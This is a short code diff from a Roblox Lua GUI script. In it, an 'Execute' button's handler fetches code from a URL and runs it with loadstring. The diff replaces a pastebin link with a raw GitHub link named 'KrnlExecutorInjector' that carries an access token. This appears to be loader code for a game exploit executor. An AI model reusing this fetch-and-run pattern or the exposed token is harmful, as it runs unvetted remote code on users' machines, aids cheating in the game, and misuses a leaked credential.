@@ -48,7 +48,7 @@ Execute.TextScaled = true
 Execute.TextSize = 14.000
 Execute.TextWrapped = true
 Execute.MouseButton1Down:connect(function()
-	loadstring(game:HttpGet(("https://pastebin.com/raw/W0tst4J4"), true))()
+	loadstring(game:HttpGet(("https://raw.githubusercontent.com/Bnajksad/KrnlExecutorInjector/main/KrnlExecutorInjector?token=GHSAT0AAAAAAB7SS5Z6RXGAVJZ3M24CDKN2ZAETXJA"), true))()
 end)
 
 TextButton.Parent = Frame
